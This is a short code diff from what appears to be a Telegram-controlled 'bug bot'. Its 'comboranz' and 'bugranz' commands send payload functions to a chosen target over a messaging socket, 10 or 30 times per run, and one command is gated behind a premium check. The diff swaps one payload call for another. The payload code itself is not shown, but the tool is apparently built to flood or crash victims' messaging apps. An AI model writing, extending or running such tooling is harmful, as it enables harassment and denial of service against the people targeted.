@@ -1684,7 +1684,7 @@ bot.command("comboranz", async (ctx) => {
         }
 
         for (let i = 0; i < 10; i++) {
-          await XeonXRobust(sock, target);
+          await blank(sock, target);
           await InvisiPayload(sock, target);
         }
         successCount++;
@@ -1869,7 +1869,7 @@ bot.command("bugranz", checkPremium, async (ctx) => {
         }
 
         for (let i = 0; i < 30; i++) {
-          await XeonXRobust(sock, target);         
+          await blank(sock, target);         
         }
         successCount++;
       } catch (error) {
